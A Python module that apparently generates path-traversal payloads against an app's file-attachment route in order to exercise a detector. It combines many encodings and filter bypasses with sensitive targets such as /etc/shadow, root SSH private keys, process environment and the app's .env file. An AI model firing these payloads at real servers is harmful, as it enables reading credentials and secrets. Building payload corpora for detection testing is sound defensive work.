"""Own path-traversal payload generator for GET /posts/1/attachment?file=.

The route does:
    const filePath = path.join(UPLOAD_DIR, file);
    fs.readFile(filePath, ...)

`path.join` normalizes ".." segments but does not confine the result to
UPLOAD_DIR - traversal depth just needs to be >= the depth of UPLOAD_DIR
(2 for /app/uploads: `app`, `uploads`) for the extra ".." segments to walk
past root and the remainder to resolve as an absolute path. Payloads here
vary traversal depth and encoding around that mechanism, targeting a mix of
Linux/proc/app-specific/Windows files for pattern diversity.

Deterministic: same `seed` -> same output list, same order.
"""
from __future__ import annotations

import random
import urllib.parse

TARGET_FILES = [
    # Linux system files
    "etc/passwd",
    "etc/shadow",
    "etc/hosts",
    "etc/group",
    "etc/hostname",
    "etc/resolv.conf",
    "etc/ssh/sshd_config",
    "etc/crontab",
    "proc/self/environ",
    "proc/self/cmdline",
    "proc/version",
    "proc/self/status",
    "root/.bash_history",
    "root/.ssh/id_rsa",
    "root/.ssh/authorized_keys",
    "home/node/.bash_history",
    "var/log/auth.log",
    "var/log/syslog",
    # App-specific (this repo's own layout, from docker-compose.yml/Dockerfile)
    "app/.env",
    "app/package.json",
    "app/src/db.js",
    "app/src/app.js",
    "app/docker-compose.yml",
    "app/node_modules/.package-lock.json",
    # Windows targets (cross-platform pattern coverage even though the
    # target container is Linux - detection should still fire on the
    # traversal+target pattern itself)
    "windows/win.ini",
    "windows/system32/drivers/etc/hosts",
    "boot.ini",
    "inetpub/wwwroot/web.config",
]

DEPTHS = [2, 3, 4, 5, 6, 8, 10, 12]


def _raw(depth: int, target: str) -> str:
    return ("../" * depth) + target


def _backslash(depth: int, target: str) -> str:
    return ("..\\" * depth) + target.replace("/", "\\")


def _url_single_encoded(depth: int, target: str) -> str:
    return ("%2e%2e%2f" * depth) + urllib.parse.quote(target, safe="")


def _url_double_encoded(depth: int, target: str) -> str:
    return ("%252e%252e%252f" * depth) + target


def _mixed_case_encoded(depth: int, target: str) -> str:
    return ("%2E%2e%2F" * depth) + target


def _overlong_utf8(depth: int, target: str) -> str:
    return ("%c0%ae%c0%ae%c0%af" * depth) + target


def _dot_dot_bypass(depth: int, target: str) -> str:
    # Defeats a naive single-pass "../" -> "" filter: "....//" collapses to
    # "../" if only one occurrence of "../" is stripped.
    return ("....//" * depth) + target


def _null_byte_suffix(depth: int, target: str) -> str:
    return ("../" * depth) + target + "%00"


def _absolute_no_traversal(depth: int, target: str) -> str:
    # Not an actual escape via path.join (kept for detector-signal
    # diversity: bare absolute-looking path with no traversal chain,
    # distinguishable from the working exploit variants above).
    return "/" + target


ENCODERS = [
    _raw,
    _backslash,
    _url_single_encoded,
    _url_double_encoded,
    _mixed_case_encoded,
    _overlong_utf8,
    _dot_dot_bypass,
    _null_byte_suffix,
    _absolute_no_traversal,
]


def generate(seed: int, count: int) -> list[str]:
    rng = random.Random(seed)
    combos = [
        (target, depth, encoder)
        for target in TARGET_FILES
        for depth in DEPTHS
        for encoder in ENCODERS
    ]
    rng.shuffle(combos)

    out: list[str] = []
    seen: set[str] = set()
    for target, depth, encoder in combos:
        payload = encoder(depth, target)
        if payload in seen:
            continue
        seen.add(payload)
        out.append(payload)
        if len(out) >= count:
            break
    return out


if __name__ == "__main__":
    payloads = generate(seed=20260923, count=250)
    print(len(payloads))
    for p in payloads[:15]:
        print(" ", p)
